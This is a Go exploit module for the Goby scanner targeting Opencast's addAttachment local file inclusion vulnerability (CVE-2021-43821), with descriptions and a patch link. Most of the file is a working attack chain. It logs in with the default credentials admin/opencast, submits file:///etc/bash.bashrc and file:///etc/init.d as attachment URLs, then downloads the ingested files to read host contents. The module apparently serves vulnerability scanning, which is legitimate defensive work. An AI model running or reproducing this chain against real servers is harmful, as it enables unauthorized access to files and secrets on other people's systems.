package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Opencast addAttachment Local File Inclusion vulnerability",
    "Description": "<p>Opencast is a live video support software of the Opencast organization for large-scale automatic video capture, management and distribution.</p><p>Opencast has a local file inclusion vulnerability that arises from Opencast opening and including local files during ingest. An attacker could exploit this to include most local files that the process has permission to read, extracting secrets from the host.</p>",
    "Product": "Opencast",
    "Homepage": "https://opencast.org/",
    "DisclosureDate": "2022-07-23",
    "Author": "橘先生",
    "FofaQuery": "body=\"LOGIN.USERNAME\" && body=\"Opencast\" && body=\"language.displayLanguage\" && body=\"currentLanguageName\"",
    "GobyQuery": "body=\"LOGIN.USERNAME\" && body=\"Opencast\" && body=\"language.displayLanguage\" && body=\"currentLanguageName\"",
    "Level": "2",
    "Impact": "<p>Opencast has a local file inclusion vulnerability that arises from Opencast opening and including local files during ingest. An attacker could exploit this to include most local files that the process has permission to read, extracting secrets from the host.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch:<a href=\"https://github.com/opencast/opencast/security/advisories/GHSA-59g4-hpg3-3gcp\">https://github.com/opencast/opencast/security/advisories/GHSA-59g4-hpg3-3gcp</a></p>",
    "References": [
        "https://mp.weixin.qq.com/s/fjna3mHraPmEy1b1wnEYrQ"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/admin-ng/j_spring_security_check",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "fresh=START",
                    "Connection": "close",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "j_username=admin&j_password=opencast"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "JSESSIONID=",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "/admin-ng/index.html",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "cookie|lastheader|regex|(JSESSIONID=.*);"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/ingest/addAttachment",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "fresh=START",
                    "Connection": "close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "cookie": "{{{cookie}}}"
                },
                "data_type": "text",
                "data": "url=file:///etc/bash.bashrc&flavor=1/2&mediaPackage=<test></test>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "/bash.bashrc",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "type=\"1/2\"><tags/><url>",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "path|lastbody|regex|(/files/mediapackage/.*?/bash.bashrc)</url>"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "{{{path}}}",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "fresh=START",
                    "Connection": "close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "cookie": "{{{cookie}}}"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "# System-wide .bashrc file for interactive bash(1) shells.",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "filename=bash.bashrc",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/admin-ng/j_spring_security_check",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "fresh=START",
                    "Connection": "close",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "j_username=admin&j_password=opencast"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "JSESSIONID=",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "/admin-ng/index.html",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "cookie|lastheader|regex|(JSESSIONID=.*);"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/ingest/addAttachment",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "fresh=START",
                    "Connection": "close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "cookie": "{{{cookie}}}"
                },
                "data_type": "text",
                "data": "url=file:///etc/init.d&flavor=1/2&mediaPackage=<test></test>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "type=\"1/2\"><tags/><url>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "/init.d",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "path|lastbody|regex|(/files/mediapackage/.*?/init.d)</url>"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "{{{path}}}",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "fresh=START",
                    "Connection": "close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "cookie": "{{{cookie}}}"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "filename=init.d",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]+)"
            ]
        }
    ],
    "Tags": [
        "File Inclusion"
    ],
    "VulType": [
        "File Inclusion"
    ],
    "CVEIDs": [
        "CVE-2021-43821"
    ],
    "CNNVD": [
        "CNNVD-202112-1293"
    ],
    "CNVD": [],
    "CVSSScore": "7.7",
    "Translation": {
        "CN": {
            "Name": "Opencast addAttachment 本地文件包含漏洞(CVE-2021-43821)",
            "Product": "Opencast",
            "Description": "<p>Opencast是Opencast组织的一款用于大规模自动视频捕获，管理和分发的直播视频支撑软件。</p><p>Opencast 存在本地文件包含漏洞，该漏洞源于Opencast会在摄取期间打开并包含本地文件。攻击者可以利用它来包含该进程有权读取的大多数本地文件，从主机中提取机密。</p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：</p><p><a target=\"_Blank\" href=\"https://github.com/opencast/opencast/security/advisories/GHSA-59g4-hpg3-3gcp\">https://github.com/opencast/opencast/security/advisories/GHSA-59g4-hpg3-3gcp</a></p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">Opencast 存在</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">本地文件包含漏洞</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">，该漏洞源于Opencast会在摄取期间打开并包含本地文件。攻击者可以利用它来包含该进程有权读取的大多数本地文件，从主机中提取机密。</span><br></p>",
            "VulType": [
                "文件包含"
            ],
            "Tags": [
                "文件包含"
            ]
        },
        "EN": {
            "Name": "Opencast addAttachment Local File Inclusion vulnerability",
            "Product": "Opencast",
            "Description": "<p style=\"text-align: justify;\">Opencast is a live video support software of the Opencast organization for large-scale automatic video capture, management and distribution.</p><p style=\"text-align: justify;\">Opencast has a local file inclusion vulnerability that arises from Opencast opening and including local files during ingest. An attacker could exploit this to include most local files that the process has permission to read, extracting secrets from the host.</p>",
            "Recommendation": "<p style=\"text-align: justify;\">At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch:<a href=\"https://github.com/opencast/opencast/security/advisories/GHSA-59g4-hpg3-3gcp\">https://github.com/opencast/opencast/security/advisories/GHSA-59g4-hpg3-3gcp</a></p>",
            "Impact": "<p>Opencast has a local file inclusion vulnerability that arises from Opencast opening and including local files during ingest. An attacker could exploit this to include most local files that the process has permission to read, extracting secrets from the host.<br></p>",
            "VulType": [
                "File Inclusion"
            ],
            "Tags": [
                "File Inclusion"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10696"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}